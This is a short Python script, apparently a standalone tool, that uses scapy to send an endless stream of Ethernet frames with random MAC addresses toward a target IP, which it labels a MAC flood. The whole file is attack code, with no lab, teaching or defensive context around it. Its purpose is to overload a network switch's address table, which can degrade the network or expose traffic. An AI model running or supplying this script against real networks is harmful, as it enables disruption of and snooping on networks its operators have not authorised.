from scapy.all import *
import time
import sys

def main():
    try:
        while 1:
            target_ip = sys.argv[1]
            mac1 = RandMAC()
            mac2 = RandMAC()

            print(f'Sending MAC...\nMAC1: {mac1}\nMAC2: {mac2}\nTARGET_IP: {target_ip}')
            packet = Ether(dst = mac1, src = mac2) / IP(dst = target_ip)
            sendp(packet, iface='eth0', verbose = False)
            time.sleep(0.5)
    except KeyboardInterrupt:
        print("MAC-flood was stopped")

main()